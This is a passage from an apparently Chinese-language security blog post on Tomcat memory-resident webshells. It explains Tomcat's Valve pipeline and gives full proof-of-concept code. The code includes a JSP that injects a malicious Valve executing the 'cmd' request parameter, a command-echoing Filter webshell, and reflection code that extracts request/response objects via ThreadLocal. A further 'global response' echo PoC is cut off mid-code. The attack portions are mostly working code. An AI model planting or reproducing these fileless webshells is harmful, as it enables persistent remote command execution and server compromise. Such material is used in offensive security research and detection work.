class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span>;<span class="hljs-comment">//是否支持异步*</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">findNonAsyncValves</span><span class="hljs-params">(Set&lt;String&gt; result)</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>org.apache.catalina.Valve</code> 的定义如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Valve</span> &#123;<br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getNext</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNext</span><span class="hljs-params">(Valve valve)</span>;<span class="hljs-comment">//设置下一个阀门</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">backgroundProcess</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><span class="hljs-keyword">throws</span> IOException, ServletException;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Tomcat 中 Pipeline 仅有一个实现 StandardPipeline，存放在 ContainerBase 的 pipeline 属性中，并且 ContainerBase 提供 <code>addValve</code> 方法调用 StandardPipeline 的 addValve 方法添加。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addValve</span><span class="hljs-params">(Valve valve)</span> &#123;<br>    <span class="hljs-keyword">if</span> (valve <span class="hljs-keyword">instanceof</span> Contained) &#123;<br>        ((Contained) valve).setContainer(<span class="hljs-built_in">this</span>.container);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (getState().isAvailable()) &#123;<br>        <span class="hljs-keyword">if</span> (valve <span class="hljs-keyword">instanceof</span> Lifecycle) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                ((Lifecycle) valve).start();<br>            &#125; <span class="hljs-keyword">catch</span> (LifecycleException e) &#123;<br>                log.error(sm.getString(<span class="hljs-string">&quot;standardPipeline.valve.start&quot;</span>), e);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (first == <span class="hljs-literal">null</span>) &#123;<br>        first = valve;<br>        valve.setNext(basic);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">Valve</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> first;<br>        <span class="hljs-keyword">while</span> (current != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (current.getNext() == basic) &#123;<br>                current.setNext(valve);<br>                valve.setNext(basic);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            current = current.getNext();<br>        &#125;<br>    &#125;<br><br>    container.fireContainerEvent(Container.ADD_VALVE_EVENT, valve);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Tomcat 中四个层级的容器都继承了 ContainerBase ，所以在哪个层级的容器的标准实现上添加自定义的 Valve 均可。</p>
+</blockquote>
+<p>添加后，将会在 <code>org.apache.catalina.connector.CoyoteAdapter</code> 的 <code>service</code> 方法中调用 Valve 的 <code>invoke</code> 方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(org.apache.coyote.Request req, org.apache.coyote.Response res)</span><br>        <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//...</span><br>        postParseSuccess = postParseRequest(req, request, res, response);<br>        <span class="hljs-keyword">if</span> (postParseSuccess) &#123;<br>            request.setAsyncSupported(<br>                    connector.getService().getContainer().getPipeline().isAsyncSupported());<br>            connector.getService().getContainer().getPipeline().getFirst().invoke(<br>                    request, response);<span class="hljs-comment">//调用invoke</span><br></code></pre></td></tr></table></figure>
+
+<p>这样思路就很清晰了，我们只要写一个恶意Valve为了方便可以继承<code>ValveBase</code>，然后将恶意代码写在invoke方法中,之后只要先通过<code>StandardContext</code>对象获取<code>StandardPipeline</code>，这样就可以利用<code>StandardPipeline.addValve()</code>动态添加Valve</p>
+<h4 id="完整POC-2"><a href="#完整POC-2" class="headerlink" title="完整POC"></a>完整POC</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Pipeline&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br>&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br> <br>    <span class="hljs-type">Pipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> standardContext.getPipeline();<br>%&gt;<br> <br>&lt;%!<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Valve</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ValveBase</span> &#123;<br> <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>%&gt;<br> <br>&lt;%<br>    <span class="hljs-type">Shell_Valve</span> <span class="hljs-variable">shell_valve</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Valve</span>();<br>    pipeline.addValve(shell_valve);<br>%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>加载Valve</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8080/Java_Shell_war_exploded/Valve.jsp<br></code></pre></td></tr></table></figure>
+
+<p>之后可以任意路径命令执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010705853.png" srcset="/img/loading.gif" lazyload alt="image-20230201070553758"></p>
+<h2 id="0x02-内存马回显技术"><a href="#0x02-内存马回显技术" class="headerlink" title="0x02 内存马回显技术"></a>0x02 内存马回显技术</h2><h3 id="回显示例"><a href="#回显示例" class="headerlink" title="回显示例"></a>回显示例</h3><p>可以利用之前的Tomcat Filter型内存马获取回显,修改一下恶意Filter</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%! <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br> <br>                <span class="hljs-comment">//将命令执行结果写入扫描器并读取所有输入</span><br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> scanner.hasNext()?scanner.next():<span class="hljs-string">&quot;&quot;</span>;<br>                scanner.close();<br>                writer.write(result);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>        chain.doFilter(request, response);<br>    &#125;<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010710660.png" srcset="/img/loading.gif" lazyload alt="image-20230201071005531"></p>
+<h3 id="ThreadLocal-Response回显"><a href="#ThreadLocal-Response回显" class="headerlink" title="ThreadLocal Response回显"></a>ThreadLocal Response回显</h3><p>实验环境:Tomcat 9.0.77 (Tomcat10后部分源码逻辑修改,以及一些反射使用会报NullPointerException)</p>
+<p>如果用Tomcat的内存马，需要JSP文件，当我们需要反序列化漏洞来注入内存马是，需要其他的方法获取request和response对象。</p>
+<p>首先要注意的是，我们寻找的request对象应该是一个和当前线程ThreadLocal有关的对象，而不是一个全局变量。这样才能获取到当前线程的相关信息。最终我们能够在<code>org.apache.catalina.core.ApplicationFilterChain</code>类中找到这样两个变量*<code>lastServicedRequest</code><em>和</em><code>lastServicedResponse</code>*。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApplicationFilterChain</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">FilterChain</span> &#123;<br><br>    <span class="hljs-comment">// Used to enforce requirements of SRV.8.2 / SRV.14.2.5.1</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;();<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>并且这两个属性还是静态的,默认赋值</p>
+</blockquote>
+<p>在<code>ApplicationFilterChain#internalDoFilter</code>中，Tomcat会将request对象和response对象存储到这两个变量中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">internalDoFilter</span><span class="hljs-params">(ServletRequest request,ServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;<br>    lastServicedRequest.set(request);<br>    lastServicedResponse.set(response);<br>&#125;<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里有一个条件<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>,默认值为false，但可以反射修改</p>
+</blockquote>
+<p>总结一下思路</p>
+<ol>
+<li>反射修改<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>的值，通过<code>ThreadLocal#set</code>方法将request和response对象存储到变量中</li>
+<li>初始化<code>lastServicedRequest</code>和<code>lastServicedResponse</code>两个变量，默认为null</li>
+<li>通过<code>ThreadLocal#get</code>方法将request和response对象从*<code>lastServicedRequest</code><em>和</em><code>lastServicedResponse</code>*中取出</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;<br> <br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br> <br><span class="hljs-meta">@WebServlet(&quot;/echo&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Tomcat_Echo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br> <br>        <span class="hljs-keyword">try</span> &#123;<br> <br>            <span class="hljs-comment">//反射获取所需属性</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">WRAP_SAME_OBJECT_FIELD</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;WRAP_SAME_OBJECT&quot;</span>);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">lastServicedRequestField</span> <span class="hljs-operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="hljs-string">&quot;lastServicedRequest&quot;</span>);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">lastServicedResponseField</span> <span class="hljs-operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="hljs-string">&quot;lastServicedResponse&quot;</span>);<br> <br>            <span class="hljs-comment">//使用modifiersField反射修改final型变量</span><br>            java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">modifiersField</span> <span class="hljs-operator">=</span> Field.class.getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<br>            modifiersField.setAccessible(<span class="hljs-literal">true</span>);<br>            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);<br>            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);<br>            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);<br>            WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="hljs-literal">true</span>);<br>            lastServicedRequestField.setAccessible(<span class="hljs-literal">true</span>);<br>            lastServicedResponseField.setAccessible(<span class="hljs-literal">true</span>);<br> <br>            <span class="hljs-comment">//将变量WRAP_SAME_OBJECT_FIELD设置为true，并初始化lastServicedRequest和lastServicedResponse变量</span><br>            <span class="hljs-keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="hljs-literal">null</span>))&#123;<br>                WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="hljs-literal">null</span>,<span class="hljs-literal">true</span>);<br>            &#125;<br> <br>            <span class="hljs-keyword">if</span> (lastServicedRequestField.get(<span class="hljs-literal">null</span>)==<span class="hljs-literal">null</span>)&#123;<br>                lastServicedRequestField.set(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;());<br>            &#125;<br> <br>            <span class="hljs-keyword">if</span> (lastServicedResponseField.get(<span class="hljs-literal">null</span>)==<span class="hljs-literal">null</span>)&#123;<br>                lastServicedResponseField.set(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;());<br>            &#125;<br> <br>            <span class="hljs-comment">//获取request变量</span><br>            <span class="hljs-keyword">if</span>(lastServicedRequestField.get(<span class="hljs-literal">null</span>)!=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-type">ThreadLocal</span> <span class="hljs-variable">threadLocal</span> <span class="hljs-operator">=</span> (ThreadLocal) lastServicedRequestField.get(<span class="hljs-literal">null</span>);<br>                <span class="hljs-type">ServletRequest</span> <span class="hljs-variable">servletRequest</span> <span class="hljs-operator">=</span> (ServletRequest) threadLocal.get();<br>                System.out.println(servletRequest);<br>                System.out.println((HttpServletRequest) servletRequest == req);<br>            &#125;<br> <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>第一次请求将request和response对象存储进变量中，第二次请求才获取到request</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(servletRequest);<br>System.out.println((HttpServletRequest) servletRequest == req);<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010824372.png" srcset="/img/loading.gif" lazyload alt="image-20230201082439227"></p>
+<h3 id="通过全局存储Response回显"><a href="#通过全局存储Response回显" class="headerlink" title="通过全局存储Response回显"></a>通过全局存储Response回显</h3><h4 id="Tomcat-9-0-55-Tomcat9-0-71废除了org-apache-catalina-loader-WebappClassLoaderBas-getResources"><a href="#Tomcat-9-0-55-Tomcat9-0-71废除了org-apache-catalina-loader-WebappClassLoaderBas-getResources" class="headerlink" title="Tomcat:9.0.55 (Tomcat9.0.71废除了org.apache.catalina.loader.WebappClassLoaderBas.getResources)"></a>Tomcat:9.0.55 (Tomcat9.0.71废除了org.apache.catalina.loader.WebappClassLoaderBas.getResources)</h4><p>在<code>AbstractProcessor</code>类中，我们能够找到全局response,在Tomcat调用栈中调用了<code>Http11Processor#service</code>方法,而<code>Http11Processor</code>继承了<code>AbstractProcessor</code>类，这里的response对象正是<code>AbstractProcessor</code>类中的属性，因此我们如果能获取到<code>Http11Processor</code>类，就能获取到response对象</p>
+<p>调用链</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">StandardService-----&gt;Connector-----&gt;Http11NioProtocol-----&gt;AbstractProtocol$ConnectoinHandler#process()-------&gt;<span class="hljs-built_in">this</span>.global--------&gt;RequestInfo-------&gt;Request--------&gt;Response<br></code></pre></td></tr></table></figure>
+
+<p>完整poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.catalina.connector.Connector;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardService;<br><span class="hljs-keyword">import</span> org.apache.coyote.ProtocolHandler;<br><span class="hljs-keyword">import</span> org.apache.coyote.RequestGroupInfo;<br><span class="hljs-keyword">import</span> org.apache.coyote.RequestInfo;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.net.AbstractEndpoint;<br> <br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br> <br><span class="hljs-meta">@WebServlet(&quot;/response&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Tomcat_Echo_Response</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br> <br>        <span class="hljs-comment">//获取StandardService</span><br>        org.apache.catalina.loader.<span class="hljs-type">WebappClassLoaderBase</span> <span class="hljs-variable">webappClassLoaderBase</span> <span class="hljs-operator">=</span> (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();<br> <br>        